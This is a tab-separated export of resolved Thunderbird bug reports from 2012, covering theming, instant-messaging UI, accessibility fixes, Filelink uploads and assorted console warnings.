742013%TAB%1333449497%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Test pilot isn't being shipped on all channels%TAB%Test pilot isn't being shipped on all channelsSomehow we only shipped test pilot in 9.0.1, and didn't include it in the distribution directory for subsequent releases (as we had intended to). This only affects new installs/upgraders from 3.1.
741998%TAB%1333447911%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Implement Australis toolbar button design%TAB%Implement Australis toolbar button designThis is the Thunderbird bug following FX Bug 734373.  FX implements the button design only in big icon mode. Because TB has a lot more buttons it isn't easy to distinguish the buttons with only icons and the default is icons beside text, so I decided to use this styling on every mode. But in difference to the previous TB button styling only with Basic and Aero theme. On Classic and High Contrast themes the toolkit buttons are used.
741865%TAB%1333441281%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Disable Test Pilot Logging by default%TAB%Disable Test Pilot Logging by defaultCurrently it appears that test pilot has logging enabled by default, there's no reason for this on user's system, if we're seeing a systematic error, we can request logging is turned on.
741733%TAB%1333416343%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%No indication of focus on selected tagged messages,No indication of focus on selected tagged messages (on WinXP theme, dotted focus border missing)%TAB%No indication of focus on selected tagged messages,No indication of focus on selected tagged messages (on WinXP theme, dotted focus border missing)Reported against current release TB 11 on WinXP, confirmed in current trunk: Mozilla/5.0 (Windows NT 5.1; rv:14.0) Gecko/20120402 Thunderbird/14.0a1  STR  1 have some messages (untagged and a coherent block of tagged msgs): msg1 - untagged msg2 - tagged important msg3 - tagged important msg4 - untagged  2 select untagged and block of tagged messages (msg1 to msg4) using shift+cursor down  3 Ctrl+cursor up to move focus between msg4 and msg1  Actual result  Focus indication on... - selected untagged msg4: dotted focus border (ok) - selected tagged msg3 and msg 2: no indication of focus (this bug) - selected untagged msg1: dotted focus border (ok) Iow, focus indication disappears without trace when Ctrl+cursoring through a block of one or more selected and tagged messages. That's a major keyboard accessibility problem.  Expected result  Focus indication on... - selected tagged msg3 and msg 2: need dotted focus border to indicate the message which has focus out of one or more selected and tagged message(s) (this bug)  This bug is similar, but not a duplicate of Bug 692062. The problem of Bug 692062 has been solved for current release; interestingly, bug 692062 was marked duplicate of bug 686959 which is still open and didn't land any patches, so I don't know what fixed bug 692062. Perhaps this bug here can be fixed by Bug 686959, Comment 39 of which also talks about tagColors-aero.css (is that file used on WinXP?). 
741729%TAB%1333415362%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Visually identify conversations with pending and direct messages%TAB%Visually identify conversations with pending and direct messagesThe conversation list should adopt a color code to instantly identity conversations with unread and/or messages directed to the user. This would possibly complement or replace the current conversation status composed of 2 numbers in parenthesis representing direct and unread messages count.  For example, bold could be used to identify conversations having received new messages since last view, and bold blue for a direct message.
741728%TAB%1333414761%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Previous conversations should be collapsed by default%TAB%Previous conversations should be collapsed by defaultThe "previous conversation" pane currently occupies whole or part of the right column. In many instances, and particularly for day to day conversations, it does not add useful information and rather 'pollutes' the visual aspect. I would like to hide this list in a collapsable pane. The expected behaviour would be: - Previous conversation pane is collapsed by default - Keep the expanded/collapsed status accross all current conversations - Expand the previous conversations pane if a conversation is displayed as a result of a click on a search result  I looked at the wireframe, refreshed myself on how XUL Treeviews work (that's the element that allows twisties, like the address book selector), and examined the chat log viewer code.  I believe this work would require an overhaul in how logs are displayed, since (I believe) the wireframe implies that logs in a particular time range ("Yesterday", for example) would be concatenated together. As it stands, the log viewer isn't really set up to do that.  That's pretty invasive work for something on beta. I think we should punt on that request (although, please correct me if I'm wrong about what the wireframe is asking for).  Jb's request for having the log list be collapsible is do-able, and likely far-less invasive.
741536%TAB%1333365790%TAB%22599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%IRC fails when there's a system HTTP proxy,IRC and XMPP connections fail when there's a system HTTP proxy%TAB%IRC fails when there's a system HTTP proxy,IRC and XMPP connections fail when there's a system HTTP proxyReproduction: 1. In GNOME settings | Proxy, enter a HTTP proxy. 2. Create a new TB profile, and start TB from the commandline 3. Create an IRC account, and connect  Actual result: "Your chat accounts are not connected". "Show chat status" shows "Lost connection to server".  Error console shows: irc: Unhandled IRC message: HTTP/1.0 400 Bad Request irc: Unhandled IRC message: Server: squid/... irc: Unhandled IRC message: Date: Mon, 02 Apr 2012 20:15:07 GMT irc: Unhandled IRC message: Content-Type: text/html irc: Unhandled IRC message: Content-Length: 1221 irc: Unhandled IRC message: Expires: Mon, 02 Apr 2012 20:15:07 GMT irc: Unhandled IRC message: X-Squid-Error: ERR_INVALID_REQ 0 irc: Unhandled IRC message: X-Cache: MISS from squid.host irc: Unhandled IRC message: X-Cache-Lookup: NONE from squid.host:1234 irc: Unhandled IRC message: Connection: close  Expected result: No HTTP proxy used for IRC.
741336%TAB%1333331589%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Provide UI to easily clear cookies from the menus%TAB%Provide UI to easily clear cookies from the menusAs suggested by the privacy review of the web search feature, we should have a UI that allows the user to clear the recent history easily (currently cookie clearing is buried in preferences).  This should be something like the Tools -> Clear Recent History option that Firefox has, probably in the same place for Thunderbird.
740956%TAB%1333108154%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Cancelling uploads to Dropbox does not work, and is unavailable for YouSendIt,Cancelling uploads to Dropbox or YouSendIt does not work, and is unavailable after first attempt%TAB%Cancelling uploads to Dropbox does not work, and is unavailable for YouSendIt,Cancelling uploads to Dropbox or YouSendIt does not work, and is unavailable after first attemptUsing Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20120330 Thunderbird/13.0a2  Steps to reproduce for Dropbox:  1)  Create both a Dropbox Filelink account. 2)  Start uploading a large file to Dropbox, and then cancel the upload.  What happens?  The icon reverts back to the non-uploading icon, but the upload continues in the background, and the URL is inserted upon completion.  What's expected?  The upload should have been cancelled.   Steps to reproduce for YouSendIt:  1)  Create a YouSendIt Filelink account 2)  Upload a large file to YouSendIt, and right-click on the attachment item to cancel it  What happens?  There's not Cancel option available for the uploading file.  What's expected?  There should be a cancel menuitem there.
740946%TAB%1333106922%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installer%TAB%Include profiler.xpt in package-manifest.in,Port Firefox's profiler to Thunderbird%TAB%Include profiler.xpt in package-manifest.in,Port Firefox's profiler to ThunderbirdBenoit Gerard and a few other folks have been working on a kick-butt profiler for Gecko apps to diagnose UI jank / stickiness.  If we're serious about improving TB responsiveness, we might want to consider integrating this work.  The work is split into several parts:  1)  We need to include profiler.xpt in our package-manifest.in in order to get Thunderbird to start spewing profiling goodness 2)  For bonus points, we'd need to submit patches to the Profiler add-on to make getting profile dumps easy.  The Github repo for the add-on is at https://github.com/bgirard/Gecko-Profiler-Addon 3)  We could inject some new probe points that are TB specific
740852%TAB%1333092802%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%No IM icons in Customize window%TAB%No IM icons in Customize windowWhen you move a toolbar button away form the chat toolbar into the customize window no icon is shown.
740765%TAB%1333073069%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Starting or selecting a conversation with the mouse should focus the input box immediately%TAB%Starting or selecting a conversation with the mouse should focus the input box immediately- When a conversation is selected with a mouse interaction, it should be immediately possible to type in that conversation (the input box should be focused). - Also, starting a conversation with the mouse (for example by clicking on the "Start conversation" bubble) should select that conversation automatically (currently it's done only if the the contact was selected at the time the conversation was started).  Behavior implemented by this patch: - When the user starts a conversation (either through the keyboard by pressing enter on a selected contact, or through the mouse by double clicking a contact or single clicking the chat bubble of a hovered contact), its textbox is focused immediately. - Selecting a conversation with the mouse gives focus to the textbox immediately. - Selecting a conversation through the keyboard (using the up/down arrow keys while the listbox of the left pane is focused) doesn't change the focus; it's still on the listbox. - When the focus is on the listbox and a conversation is selected: -- pressing the enter or return keys gives the focus to the input box of the conversation. -- typing a character focuses the input box of the conversation AND resends the keyboard event so that the input box receives is.
740749%TAB%1333069058%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Start a new conversation in IRC does not open the conversation,Starting a conversation with an IRC contact does not remove it from the online contacts list%TAB%Start a new conversation in IRC does not open the conversation,Starting a conversation with an IRC contact does not remove it from the online contacts listSTR:  - Click on an IRC online contact - The last conversation w/ this contact is displayed - Click 'Start a new conversation'  Current results - A new conversation with the name of the contact appears in the conversation list - Contact name remains listed in Online contacts - The last conversation remains displayed   Expected results - The contact name should move from 'Online contacts' to 'Conversations' - The newly created conversation should be displayed, ready to start
740680%TAB%1333036774%TAB%360522%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%TB-IM: Remove "#!" from copying Twitter's tweet url%TAB%TB-IM: Remove "#!" from copying Twitter's tweet urlRemove "#!" from copying Twitter's tweet url. Does this cause some sort of issue? If you go to the URL as given in your patch it will simply redirect you to the one with #! in it. Why do you wish to remove this?
740502%TAB%1333011954%TAB%253233%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Opening a previous conversation causes character encoding error%TAB%Opening a previous conversation causes character encoding errorSTR:  1. Create a random conversation and write something 2. Close the conversation 3. Click on the contact, it will open the previous conversation  Results:  Error: The character encoding of the HTML document was not declared. The document will render with garbled text in some browser configurations if the document contains characters from outside the US-ASCII range. The character encoding of the page must to be declared in the document or in the transfer protocol. Source File: chrome://chat/content/conv.html Line: 0
740499%TAB%1333011807%TAB%253233%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%IM Search doesn't seem to work,IM conversations aren't indexed in gloda on the fly%TAB%IM Search doesn't seem to work,IM conversations aren't indexed in gloda on the flySo this is what I did, maybe it can be reproduced differently too:   1. Start a conversation with an offline gtalk contact 2. Write "something" 3. Close the conversation 4. Use "Search all conversations" and search for "something"  Results:  There are no search results  Expected:  The just created conversation where I wrote "something" should show up.
740451%TAB%1333008585%TAB%253233%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%IRC account cannot be created (uncaught exception, NS_ERROR_FILE_TOO_BIG in mozIStorageConnection.setGrowthIncrement),IM account cannot be created if less than 500MB available on disk (uncaught exception, NS_ERROR_FILE_TOO_BIG in mozIStorageConnection.setGrowthIncrement)%TAB%IRC account cannot be created (uncaught exception, NS_ERROR_FILE_TOO_BIG in mozIStorageConnection.setGrowthIncrement),IM account cannot be created if less than 500MB available on disk (uncaught exception, NS_ERROR_FILE_TOO_BIG in mozIStorageConnection.setGrowthIncrement)I've experienced this on Windows:  1. Open the new chat account wizard in a new profile 2. It happens to me both with setting irc.mozilla.org and also the default settings 3. Go through the wizard until the finish button appears   Results:  * The finish button doesn't do anything. * I get this error message randomly either once per wizard, or when clicking the finish button:  Timestamp: 3/29/2012 7:04:22 PM Error: uncaught exception: [Exception... "Component returned failure code: 0x8052000f (NS_ERROR_FILE_TOO_BIG) [mozIStorageConnection.setGrowthIncrement]"  nsresult: "0x8052000f (NS_ERROR_FILE_TOO_BIG)"  location: "JS frame :: resource:///components/imContacts.js :: getDBConnection :: line 57"  data: no]  * Its not totally reliable when the message shows up. Sometimes it doesn't appear when clicking the finish button, but some time before.  * I'm not getting the error messages in bug 740288.
740358%TAB%1333000708%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%The Chat tab should reopen itself automatically only for messages directed to the user%TAB%The Chat tab should reopen itself automatically only for messages directed to the userCurrently any received messages (even a left/join message in a chat room) reopens the Chat tab if the user has closed it. This is annoying. Alternatively, not even reopen tabs but indicate that there are things needing attention.  I'm not sure that the expectations around automatic tab openings (which are common in IM clients) would fly well with TB users (for whom, I'm guessing, the tab behaviors are likely expected to be more like Firefox or other non-IM apps -- as they're styled the same, etc.)
740035%TAB%1332921732%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Port Bug 734371 [Adjust toolbar color for Australis]%TAB%Port Bug 734371 [Adjust toolbar color for Australis]The Australis theme is using a other toolbar background color. This Bug is for changing this.
739912%TAB%1332892564%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Remove obsolete workaround pref editor.quotesPreformatted in TB%TAB%Remove obsolete workaround pref editor.quotesPreformatted in TBThe pref  editor.quotesPreformatted  was introduced as a "temporary" hack for bug 69638.  It's used in two places:  * nsHTMLEditor::InsertAsPlaintextQuotation()   if somehow set True, puts reply-quotes inside a <pre> rather than    a <span> in the plain-text editor.  No visible effect in the compose window,   but requires an extra rule in HTML.CSS to colorize the pre[_moz_quote].  * nsPlainTextSerializer::Write()   if True, may cause a bypass of the "no intelligent wrapping" section of the   DOM-to-Text conversion of the plain-text editor's buffer into a message,   thereby preventing quotes from being wrapped -- the same behavior seen when   the pref is turned off and the quote is contained within a <span>.  The pref is set to False by default; I seriously doubt anyone still uses this for anything.  I gather it was desirable when there was some other, harder-to-deal-with problem in the editor's behavior within a <pre>, but that's obsolete now.  This pref and the code supporting it is all cruft, and should be removed.  xref bug 233705 -- the pref discussed at that bug also "bypasses the 'no intelligent wrapping'" DOM-to-text conversion.
739782%TAB%1332849820%TAB%49577%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs,General%TAB%test_saveTemplate.js: mailServices.js is not in gre%TAB%test_saveTemplate.js: mailServices.js is not in gre{ /mailnews/imap/test/unit/test_saveTemplate.js     * line 44 -- Components.utils.import("resource://gre/modules/mailServices.js"); }  Just remove "gre".
739683%TAB%1332835967%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%chat - selected items don't look as such on linux%TAB%chat - selected items don't look as such on linuxNeeds highlight background for selected items in the contactslistbox on Linux.
739677%TAB%1332834982%TAB%285656%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Disability Access%TAB%[Instant messaging] not all buttons like "Accounts", "New contact" are keyboard accessible,No way to access the "Add Contact" and "Join Chat" actions of the IM feature with the keyboard%TAB%[Instant messaging] not all buttons like "Accounts", "New contact" are keyboard accessible,No way to access the "Add Contact" and "Join Chat" actions of the IM feature with the keyboardNot all buttons in the tool bars like the "Ad contact", "join chat" and "Accounts" buttons are keyboard accessible/tabable. Others like the status menu button, search field etc. are. All of the buttons should be reachable via the keyboard.
739652%TAB%1332832657%TAB%285656%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Disability Access%TAB%[Instant messaging] The textboxes in the account settings for a GoogleTalk account have no labels%TAB%[Instant messaging] The textboxes in the account settings for a GoogleTalk account have no labelsFor screen readers, the password field and other fields except the "resource" field under "advanced" have no labels. Screen readers don't speak anything besides "textbox", so users don't know what to enter here.  If there are labels, they need to be properly associatd with the textboxes via the controls attribute. If they are provided via a different means, they're currently not accessible at all.  Sorry about this, and thanks for reporting it! The labels did exist, but the field ids have been renamed at some point and I forgot to change the values of the control attributes.  I wonder if label elements with a control attribute that doesn't match any element id in the document could produce a warning in the error console, so that such trivial mistakes are caught faster.
739644%TAB%1332832082%TAB%285656%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Disability Access%TAB%[Instant messaging] provide an indication that an item is expanded or collapsed like "offline contacts"%TAB%[Instant messaging] provide an indication that an item is expanded or collapsed like "offline contacts"The list of contacts contains items that are expandable or collapsable. However, since this is not a xul:tree widget but rather a list widget, an ARIA attribute needs to be provided to indicate to assistive technologies that an item is collapsed or expanded, and needs to be adjusted whenever the state changes.  To implement: 1. On items such as "offline contacts", put the attribute aria-expanded and give it a value of "false" if the item is collapsed or "true" if it is expanded. 2. Whenever the state changes, like when pressing right arrow to expand or left arrow to collapse, change this attribute to the appropriate value.  This is enough to indicate to screen readers which state the list item is in.
739639%TAB%1332831776%TAB%287320%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%forwarding message puts cursor at beginning instead of end,forwarding message puts cursor at end instead of beginning%TAB%forwarding message puts cursor at beginning instead of end,forwarding message puts cursor at end instead of beginningWith nightly just updated from HG, if you forward a message inline the cursor starts at the end of the text in the forward compose window.  With TB 11 it is positioned at the beginning, above the forward, as it's supposed to be.  This bug is now in the Thunderbird 13 beta. It's a regression. Surely it needs to be fixed before it gets shipped? Is somebody looking at it?
739631%TAB%1332830725%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Filelink account management pane in preferences dialog needs styling polish for Windows XP%TAB%Filelink account management pane in preferences dialog needs styling polish for Windows XPOn Windows XP, the Filelink account management pane looks a bit funny.  In particular:  1)  It looks like the Add / Remove buttons are being cut off at the bottom 2)  The Dropbox / YouSendIt panels have scrollbars
739599%TAB%1332827415%TAB%285656%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Disability Access%TAB%[Instant messaging] Make the conversation output a WAI-ARIA live region%TAB%[Instant messaging] Make the conversation output a WAI-ARIA live regionMaking it a live region makes sure screen readers speak the output as soon as it happens without the user having to review every bit of it manually. This can be done by adding aria-live="polite" to the top most parent element of what contains the chat output. So if there's a div around the elements containing all the conversation text, use that, or the body element of that HTML output widget.
739311%TAB%1332752651%TAB%320634%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General,Message Reader UI%TAB%can't drag the divider down for multiple recipients,can't drag the addressee pane divider down to resize for multiple recipients,Clicking "x more" button shrinks(!) message header height, so that *less* or even *no* recipients are in view [multiple, many, lots of recipients]%TAB%can't drag the divider down for multiple recipients,can't drag the addressee pane divider down to resize for multiple recipients,Clicking "x more" button shrinks(!) message header height, so that *less* or even *no* recipients are in view [multiple, many, lots of recipients]User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:12.0) Gecko/20100101 Firefox/12.0 Build ID: 20120321033733  Steps to reproduce:  My issue was listed, but is marked 'resolved, works for me'.  Please refer to screenshot.  I clicked on '18 more' (screenshot 1) expecting the address pane to enlarge so as to accommodate all the recipients.   Actual results:  As you can see, the recipients' addresses are all obscured (screenshot 2). They can be visified by rotating the scroll wheel on my Kensington Expert Mouse, but no amount of clicking or dragging will persuade the divider line to enlarge the pane so as to be able to view all the addresses in one open window.   Expected results:  When '18 more' is clicked, the pane should enlarge so as to accommodate the addressees. If the divided is clicked on, a handle should appear that would allow resizing of the address pane.
739279%TAB%1332748053%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Polish required in YouSendIt setup dialog,Polish required in Filelink account setup dialog%TAB%Polish required in YouSendIt setup dialog,Polish required in Filelink account setup dialogThe YouSendIt setup dialog has a few tiny issues.  Across qute/pinstripe/gnomestrip, the "Username:" label needs some space to the right before the text input.  And on Windows, the username text input needs to terminate at the same point that the dropdown menu terminates.
739228%TAB%1332741482%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%"Interface module loaded." in the error console is noise%TAB%"Interface module loaded." in the error console is noiseThe "Interface module loaded." messages that I see in my error console at startup (because of Test pilot) is just noise. It doesn't inform of anything and I had to do an mxr query to have an idea of what it was about.  I think we should either remove it, or if it's supposed to contain useful information, have someone who knows what it means rephrase it.  The patch I'm attaching removes that message. I also changed the other Services.console.logStringMessage call of the file to Components.utils.reportError as I think it will give a better error reporting with location information, but I really don't mind if we don't take that second change (I haven't tested it, as I don't know in which case that code would throw).
739222%TAB%1332740297%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Noise in the terminal at startup if no default account%TAB%Noise in the terminal at startup if no default accountaccountManager.defaultAccount throws if there's no default account. There was some effort in bug 342632 to change that, but it got stalled.  I think just getting rid of the noise in the terminal would already be an improvement. This is what the patch I'm attaching does (it doesn't hide the error when it's unexpected; it will go to the console instead of the terminal).
739210%TAB%1332737869%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Preferences%TAB%No "secure" icon in Dropbox OAuth window on Windows Aero,browserRequest.css not packaged for Windows Aero%TAB%No "secure" icon in Dropbox OAuth window on Windows Aero,browserRequest.css not packaged for Windows AeroOn OSX and Ubuntu, the OAuth window that spawns when authorizing TB to use a Dropbox account has a green circle near the address bar, to indicate that we're in a secure session.  Windows 7 appears to lack that icon. Preliminary investigation shows that the browserRequest.css is not being packaged for the Windows Aero theme.  This patch fixes that.
739208%TAB%1332736616%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%CSS warning when the account provisioner is displayed%TAB%CSS warning when the account provisioner is displayedWarning: Unknown pseudo-class or pseudo-element 'placeholder'.  Ruleset ignored due to bad selector. Source File: chrome://messenger/skin/newmailaccount/accountProvisioner.css Line: 224  Line 224 is: #search input[type="text"]:placeholder {  The same code exists in all 3 themes: /mail/themes/qute/mail/newmailaccount/accountProvisioner.css /mail/themes/pinstripe/mail/newmailaccount/accountProvisioner.css /mail/themes/gnomestripe/mail/newmailaccount/accountProvisioner.css  I think ":placeholder" just needs to be replaced with ":-moz-placeholder", see https://developer.mozilla.org/en/CSS/:-moz-placeholder
739181%TAB%1332730123%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Chat - The contact info header in the sidebar incorrectly gets a persona background.%TAB%Chat - The contact info header in the sidebar incorrectly gets a persona background.The contact info header in the sidebar incorrectly gets a persona background on the mac.
738982%TAB%1332591134%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%TB-IM: Style the Chat window system friendlier%TAB%TB-IM: Style the Chat window system friendlierThe actual styles are Win7 centric also under Windows XP or Classic mode. The backgrounds have a fixed light blue background, the splitters are 1px wide. Also the list items have a Win7 style.
738907%TAB%1332557173%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Bad failure: Saving drafts with attachments closes TB application,Bad failure: Using red [x] button to close & save draft with attachments shuts down TB application,Bad failure: Using red [x] button to close & save draft composition shuts down TB application,Win XP, POP3: Using red [x] button to close & save draft composition window shuts down TB application,Using red [x] button to close & save draft composition window shuts down TB application (seen on Win XP, POP3),Using red [x] button to close & save draft composition window unexpectedly terminates TB application,Using red [x] button to close & save draft composition window unexpectedly terminates TB application (on Windows),Using red [x] button to close & save draft composition window unexpectedly terminates TB application%TAB%Bad failure: Saving drafts with attachments closes TB application,Bad failure: Using red [x] button to close & save draft with attachments shuts down TB application,Bad failure: Using red [x] button to close & save draft composition shuts down TB application,Win XP, POP3: Using red [x] button to close & save draft composition window shuts down TB application,Using red [x] button to close & save draft composition window shuts down TB application (seen on Win XP, POP3),Using red [x] button to close & save draft composition window unexpectedly terminates TB application,Using red [x] button to close & save draft composition window unexpectedly terminates TB application (on Windows),Using red [x] button to close & save draft composition window unexpectedly terminates TB applicationTB Trunk 14.0a1 2012-03-23 on win xp  STR  1 click Write for a new msg 2 attach file (smaller or bigger than bigfiles threshold) 3 close msg window using red [x] button (important!) 4 from save message dialogue, click Save  Actual result  - TB main application is unexpectedly closed (reproducable every time) - draft is correctly saved - bug does not occur when closing msg window with File > Close or Ctrl+W - bug does not occur in TB11, so this is a recent regression  Expected result  - TB shouldn't die from closing a draft, just closing the draft would be fine - improve our system of QA to prevent such major bugs in basic functionality from being introduced unnoticed
738792%TAB%1332508191%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%fix strict Javascript warnings in Thunderbird addressbook (found in Error console)%TAB%fix strict Javascript warnings in Thunderbird addressbook (found in Error console)Timestamp: 23.03.2012 22:07:04 Warning: octal literals and octal escape sequences are deprecated Source File: chrome://messenger/content/addressbook/abTrees.js Line: 158, Column: 46 Source Code:       foStream.init(file, 0x02 | 0x08 | 0x20, 0666, 0);   Timestamp: 23.03.2012 22:07:04 Warning: function getDirectoryValue does not always return a value Source File: chrome://messenger/content/addressbook/abTrees.js Line: 207  Timestamp: 23.03.2012 22:07:04 Warning: octal literals and octal escape sequences are deprecated Source File: chrome://messenger/content/addressbook/abCommon.js Line: 875, Column: 62 Source Code:     file.create(Components.interfaces.nsIFile.DIRECTORY_TYPE, 0777);
738719%TAB%1332497646%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Instant Messaging%TAB%Investigate running mozmill tests with an IM account in the default profile,Run mozmill tests with an IM account in the default profile%TAB%Investigate running mozmill tests with an IM account in the default profile,Run mozmill tests with an IM account in the default profile(In reply to David :Bienvenu from bug 736486 comment #3) > I wonder if it would possible to tweak the mozmill tests to define an im > account in the default profile and see if any of the tests break in > interesting ways.  I've tried this, here are the results:  - The only test that is consistently broken is mail/test/mozmill/account/test-archive-options.js because it hardcodes the index of accounts in the Account Settings dialog.  - The other failures I saw seem random (although I wouldn't guarantee it, I'm not expert yet at the art of reading these obfuscated test result logs).  - I also noticed some noise in the log that can (and I think should) be fixed (bug 738711).  I'm attaching the changes I made to try this, so that others can try too.  I don't know if we want to integrate this patch, so requesting feedback instead of review.
738711%TAB%1332496863%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%The rootMsgFolder getter of imIncomingServer is sometimes called%TAB%The rootMsgFolder getter of imIncomingServer is sometimes calledI saw this while running mozmill tests with an IRC account in the default profile. It's called with this stack:  0 anonymous() ["file:///Users/florian/buildhg/comm-central/obj-tbird/mozilla/dist/DailyDebug.app/Contents/MacOS/components/imIncomingServer.js":218]     this = [object Object] 1 GetInboxFolder(server = [object Object]) ["chrome://messenger/content/mailWindowOverlay.js":1158]     nsMsgFolderFlags = undefined     rootMsgFolder = undefined     this = [object ChromeWindow @ 0x3050780 (native @ 0x304ffb8)] 2 MigrateFolderViews() ["chrome://messenger/content/msgMail3PaneWindow.js":1256]     index = 2     inbox = [xpconnect wrapped nsIMsgFolder @ 0x30747a0 (native @ 0x1e479800)]     server = [object Object]     servers = [xpconnect wrapped nsISupportsArray @ 0x30746a0 (native @ 0x3074660)]     folderViewsVersion = 0     this = [object ChromeWindow @ 0x3050780 (native @ 0x304ffb8)] 3 LoadPostAccountWizard() ["chrome://messenger/content/msgMail3PaneWindow.js":449]     toolbarset = undefined     toolbox = undefined     completeStartup = [function]     startMsgHdr = undefined     startFolderURI = undefined     this = [object ChromeWindow @ 0x3050780 (native @ 0x304ffb8)] 4 OnLoadMessenger() ["chrome://messenger/content/msgMail3PaneWindow.js":413]     panelcontainer = undefined     tabmail = [object XULElement @ 0x21ee7aa0 (native @ 0x1e07bff0)]     this = [object ChromeWindow @ 0x3050780 (native @ 0x304ffb8)] 5 onload(event = [object Event @ 0x1d757cb0 (native @ 0x1e0c8230)]) ["chrome://messenger/content/messenger.xul":1]     this = [object ChromeWindow @ 0x3050780 (native @ 0x304ffb8)]   Not implementing it seems harmless as GetInboxFolder has a try/catch and will return null when an exception is thrown, the only visible effect is "TypeError: rootMsgFolder is null" printed in the log as GetInboxFolder dumps the exception.  I don't like noise and some future caller may not be as careful as GetInboxFolder so I think we should still fix it.
738451%TAB%1332420980%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Permanent orange for release builds TB 12 & later: TEST-UNEXPECTED-FAIL | test-eml-subject.js%TAB%Permanent orange for release builds TB 12 & later: TEST-UNEXPECTED-FAIL | test-eml-subject.jsTest Failure: a != b: 'Mozilla Thunderbird' != 'Thunderbird'. TEST-UNEXPECTED-FAIL | e:\buildbot\win32-unittest-mozmill-beta\build\mozmill\message-window\test-eml-subject.js | test-eml-subject.js::test_eml_empty_subject TEST-START | e:\buildbot\win32-unittest-mozmill-beta\build\mozmill\message-window\test-eml-subject.js | test_eml_normal_subject Test Failure: a != b: 'An email - Mozilla Thunderbird' != 'An email - Thunderbird'. TEST-UNEXPECTED-FAIL | e:\buildbot\win32-unittest-mozmill-beta\build\mozmill\message-window\test-eml-subject.js | test-eml-subject.js::test_eml_normal_subject  The issue here is that in messenger.xul, we're using titledefault.label which equates to brandFullName, however the unit test is getting brandShortName.  This is fine for the non-official builds, but breaks when we get around to the official ones.  The fix is simple - use the right string
738367%TAB%1332412258%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Avoid undefined properties JS warnings caused by imIncomingServer.js%TAB%Avoid undefined properties JS warnings caused by imIncomingServer.jsThe attached patch cleans up various warnings caused by imIncomingServer.js not implementing some properties that end up actually read.  Example of warning this fixes: Warning: reference to undefined property mgr.accounts Source File: chrome://messenger/content/mail3PaneWindowCommands.js Line: 412  The warnings displayed in the console were all incorrect because of bug 383524 so this wasn't as easy to figure out as it could have been.
738299%TAB%1332405624%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Compose Window%TAB%Need notification bar when Filelink upload begins%TAB%Need notification bar when Filelink upload beginsSince Filelink uploads in their current form do not have a progress bar to indicate how far along we are, we'd like to inform the user that the uploads have indeed begun, and that when completed, the link will be inserted into the body of their email.
738243%TAB%1332396808%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Filelink  account setup dialog fro YouSendIt is not nicely aligned%TAB%Filelink  account setup dialog fro YouSendIt is not nicely alignedIt would be nicer to have the 'Need an acount' text aligned with the menulist, and spaced one line below.
